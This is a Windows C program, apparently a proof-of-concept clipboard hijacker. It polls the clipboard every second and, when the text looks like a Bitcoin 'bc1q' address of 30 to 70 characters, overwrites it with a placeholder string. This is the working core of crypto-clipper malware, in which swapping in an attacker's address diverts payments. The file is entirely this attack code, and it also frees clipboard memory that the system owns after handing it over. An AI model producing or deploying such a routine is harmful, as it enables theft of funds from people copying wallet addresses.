#include <stdio.h>
#include <string.h>
#include <windows.h>

const char StringToDetect[] = "bc1q";
const char NewString[] = "Clipboard Hijacked!";
unsigned int MinString = 30;
unsigned int MaxString = 70;

int main()
{
	printf("[*] Monitoring clipboard... [*]\n");

	while (1)
	{
		if (OpenClipboard(NULL) == 0)
		{
			printf("[-] Can't open clipboard (Error %ld) [-]\n", GetLastError());
			Sleep(1000);
			continue;
		}

		HANDLE GetData = GetClipboardData(CF_TEXT);
		if (GetData == NULL)
		{
			printf("[-] Clipboard data not in text format or empty (Error %ld) [-]\n", GetLastError());
			CloseClipboard();
			Sleep(1000);
			continue;
		}

		char *ClipboardText = (char*)GlobalLock(GetData);
		if (ClipboardText == NULL)
		{
			printf("[-] Failed to lock clipboard data (Error %ld) [-]\n", GetLastError());
			CloseClipboard();
			Sleep(1000);
			continue;
		}

		size_t TextLength = strlen(ClipboardText);
		if (strncmp(ClipboardText, StringToDetect, strlen(StringToDetect)) == 0 && TextLength >= MinString && TextLength <= MaxString)
		{
			printf("[*] Detected! Replacing clipboard contents... [*]\n");
			size_t NewLength = strlen(NewString) + 1;
			HGLOBAL MemoryGlob = GlobalAlloc(GMEM_MOVEABLE, NewLength);
			if (MemoryGlob != NULL)
			{
				memcpy(GlobalLock(MemoryGlob), NewString, NewLength);
				GlobalUnlock(MemoryGlob);
				EmptyClipboard();
				SetClipboardData(CF_TEXT, MemoryGlob);
				if (GlobalFree(MemoryGlob) != NULL)
				{
					printf("[-] Failed to free object (Error %ld) [-]\n", GetLastError());
				}

				printf("[+] Clipboard contents replaced [+]\n");
			}
			else
			{
				printf("[-] Memory allocation failed [-]\n");
			}
		}

		GlobalUnlock(GetData);
		CloseClipboard();
		Sleep(1000);
		}

	return 0;
}
